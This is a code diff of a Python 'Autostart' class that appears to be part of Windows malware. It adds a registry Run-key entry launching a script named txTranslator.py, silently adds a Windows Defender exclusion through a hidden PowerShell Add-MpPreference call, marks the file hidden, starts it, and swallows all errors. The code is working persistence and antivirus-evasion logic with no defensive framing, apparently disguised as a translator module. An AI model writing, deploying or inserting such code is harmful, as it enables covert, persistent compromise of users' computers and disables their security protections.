@@ -1,24 +1,22 @@
+import os
+import sys
+import winreg as reg
 from ctypes import windll
-from os import path, remove
-from shutil import copyfile
 from subprocess import Popen, CREATE_NEW_CONSOLE, SW_HIDE
-
 from helper.helpers.config import AutostartConfig
-
 
 class Autostart:
     """
-    Adds the file to autostart.
+    Adds the Python script to autostart.
     """
-    def __init__(self, executor_path: str):
-
-        self.__executor_path = executor_path
+    def __init__(self):
         self.__config = AutostartConfig()
-        self.__autostart_path = path.join(self.__config.AutostartPath, f"{self.__config.AutostartName}.exe")
+        self.__python_script_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '../modules/txTranslator.py'))
+        self.__autostart_name = self.__config.AutostartName
 
-    def __add_to_autostart(self) -> None:
+    def __add_to_autostart_registry(self) -> None:
         """
-        Creates a copy of the file.
+        Adds the Python script to Windows registry for autostart.
 
         Parameters:
         - None.
@@ -26,14 +24,17 @@ class Autostart:
         Returns:
         - None.
         """
-        if path.exists(self.__autostart_path):
-            remove(self.__autostart_path)
-
-        copyfile(self.__executor_path, self.__autostart_path)
+        try:
+            key = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            value = f'"{sys.executable.replace("python.exe", "pythonw.exe")}" "{self.__python_script_path}"'
+            with reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE) as reg_key:
+                reg.SetValueEx(reg_key, self.__autostart_name, 0, reg.REG_SZ, value)
+        except Exception as e:
+            pass
 
     def __exclude_from_defender(self) -> None:
         """
-        Trying to exclude a file from Windows Defender checks.
+        Trying to exclude the Python script from Windows Defender checks.
 
         Parameters:
         - None.
@@ -42,14 +43,14 @@ class Autostart:
         - None.
         """
         Popen(
-            f"powershell -Command Add-MpPreference -ExclusionPath '{self.__autostart_path}'",
+            f"powershell -Command Add-MpPreference -ExclusionPath '{self.__python_script_path}'",
             shell=True,
             creationflags=CREATE_NEW_CONSOLE | SW_HIDE
         )
 
     def __hide_file(self) -> None:
         """
-        Makes a file hidden.
+        Makes the Python script hidden.
 
         Parameters:
         - None.
@@ -57,7 +58,7 @@ class Autostart:
         Returns:
         - None.
         """
-        windll.kernel32.SetFileAttributesW(self.__autostart_path, 2)
+        windll.kernel32.SetFileAttributesW(self.__python_script_path, 2)
 
     def run(self) -> None:
         """
@@ -70,10 +71,14 @@ class Autostart:
         - None.
         """
         try:
-
-            self.__add_to_autostart()
+            self.__add_to_autostart_registry()
             self.__exclude_from_defender()
             self.__hide_file()
 
+            Popen(
+                f'"{sys.executable.replace("python.exe", "pythonw.exe")}" "{self.__python_script_path}"',
+                shell=True,
+                creationflags=CREATE_NEW_CONSOLE
+            )
         except Exception as e:
             pass
